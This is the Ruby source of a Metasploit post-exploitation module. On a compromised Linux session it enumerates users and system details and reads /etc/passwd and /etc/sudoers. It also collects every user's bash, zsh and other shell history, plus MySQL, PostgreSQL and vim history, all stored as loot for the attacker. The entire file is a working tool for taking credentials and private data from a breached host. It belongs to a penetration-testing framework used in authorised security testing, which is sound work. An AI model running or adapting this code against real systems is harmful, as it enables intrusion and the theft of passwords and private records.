##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
        'Name'         => 'Linux Gather User History',
        'Description'  => %q{
          This module gathers user specific information.
          User list, bash history, mysql history, vim history,
          lastlog and sudoers.
        },
        'License'      => MSF_LICENSE,
        'Author'       =>
          [
            # based largely on get_bash_history function by Stephen Haywood
            'ohdae <bindshell[at]live.com>'
          ],
        'Platform'     => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter']
      ))
  end

  def run
    distro = get_sysinfo

    print_good('Info:')
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    users = execute('/bin/cat /etc/passwd | cut -d : -f 1')
    user = execute('/usr/bin/whoami')

    mount = execute('/bin/mount -l')
    shells = %w{ ash bash csh ksh sh tcsh zsh }
    shells.each do |shell|
      get_shell_history(users, user, shell)
    end
    get_mysql_history(users, user)
    get_psql_history(users, user)
    get_vim_history(users, user)
    last = execute('/usr/bin/last && /usr/bin/lastlog')
    sudoers = cat_file('/etc/sudoers')

    save('Last logs', last) unless last.blank?
    save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
  end

  def save(msg, data, ctype = 'text/plain')
    ltype = 'linux.enum.users'
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo['Computer']
    when /shell/
      host = session.shell_command_token('hostname').chomp
    end
    print_status("Running module against #{host}")
    host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    output
  end

  def get_shell_history(users, user, shell)
    return if shell.nil?
    if user == 'root' && !users.nil?
      users = users.chomp.split
      users.each do |u|
        if u == 'root'
          vprint_status("Extracting #{shell} history for #{u}")
          hist = cat_file("/root/.#{shell}_history")
        else
          vprint_status("Extracting #{shell} history for #{u}")
          hist = cat_file("/home/#{u}/.#{shell}_history")
        end
        save("#{shell} History for #{u}", hist) unless hist.blank? || hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting #{shell} history for #{user}")
      hist = cat_file("/home/#{user}/.#{shell}_history")
      vprint_status(hist)
      save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
    end
  end

  def get_mysql_history(users, user)
    if user == 'root' && !users.nil?
      users = users.chomp.split
      users.each do |u|
        if u == 'root'
          vprint_status("Extracting MySQL history for #{u}")
          sql_hist = cat_file('/root/.mysql_history')
        else
          vprint_status("Extracting MySQL history for #{u}")
          sql_hist = cat_file("/home/#{u}/.mysql_history")
        end
        save("MySQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting MySQL history for #{user}")
      sql_hist = cat_file("/home/#{user}/.mysql_history")
      vprint_status(sql_hist) if sql_hist
      save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
    end
  end

  def get_psql_history(users, user)
    if user == 'root' && !users.nil?
      users = users.chomp.split
      users.each do |u|
        if u == 'root'
          vprint_status("Extracting PostgreSQL history for #{u}")
          sql_hist = cat_file('/root/.psql_history')
        else
          vprint_status("Extracting PostgreSQL history for #{u}")
          sql_hist = cat_file("/home/#{u}/.psql_history")
        end
        save("PostgreSQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting PostgreSQL history for #{user}")
      sql_hist = cat_file("/home/#{user}/.psql_history")
      vprint_status(sql_hist) if sql_hist
      save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
    end
  end

  def get_vim_history(users, user)
    if user == 'root' && !users.nil?
      users = users.chomp.split
      users.each do |u|
        if u == 'root'
          vprint_status("Extracting VIM history for #{u}")
          vim_hist = cat_file('/root/.viminfo')
        else
          vprint_status("Extracting VIM history for #{u}")
          vim_hist = cat_file("/home/#{u}/.viminfo")
        end
        save("VIM History for #{u}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting history for #{user}")
      vim_hist = cat_file("/home/#{user}/.viminfo")
      vprint_status(vim_hist)
      save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
    end
  end
end
